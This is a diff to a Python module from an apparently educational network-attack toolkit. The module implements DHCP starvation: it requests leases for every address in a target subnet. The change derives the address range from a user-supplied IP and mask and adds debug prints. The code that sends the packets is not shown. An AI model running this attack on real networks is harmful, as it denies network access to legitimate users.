@@ -1,5 +1,6 @@
 # https://github.com/shamiul94/DHCP-Spoofing-Attack-Network-Security/blob/master/Final-Codes/Request_Starve.py
 from Project import *
+import ipaddress
 
 req_port = "any"
 name = "DHCP Starvation"
@@ -8,22 +9,28 @@ function_name = "starve"
 
 def starve(values):
 
-
-    offer_count = 0
-    ip_pool_start = 1
-    current_ip = ip_pool_start
     requested_IP = ''
     
     print("Running DHCP starvation:\n")
-    valid_var = ["target_ip"]
+    valid_var = ["target_ip", "subnet"]
     help_statement = "\nsends a multitude of DHCP queries to attempt to create leases for all available IP addresses"
     variable_input(valid_var, help_statement, values)
-    
-    #subnet = values.get("subnet")
-    subnet = "172.15.7."
+    all_variables_inputted(values, valid_var)
+    check_var(values, valid_var)
+    iface = ipaddress.ip_network(values.get("target_ip") + "/" + values.get("subnet"), strict=False)
+    octets = str(iface.network_address).split(".")
+    ip_pool_start = int(octets[3]) + 1
+    octets = str(iface.broadcast_address).split(".")
+    last_ip = int(octets[3]) - ip_pool_start
+    subnet = str(iface.network_address).split(".")
+    del subnet[-1]
+    subnet = ".".join(subnet)
+    subnet = subnet + "."
 
-    for i in range(253):
-        current_ip = (ip_pool_start + i)
+    for i in range(1,last_ip):
+        print(i)
+        current_ip = (int(ip_pool_start) + int(i))
+        print(current_ip)
         requested_IP = subnet + str(current_ip)
         print(requested_IP)
 
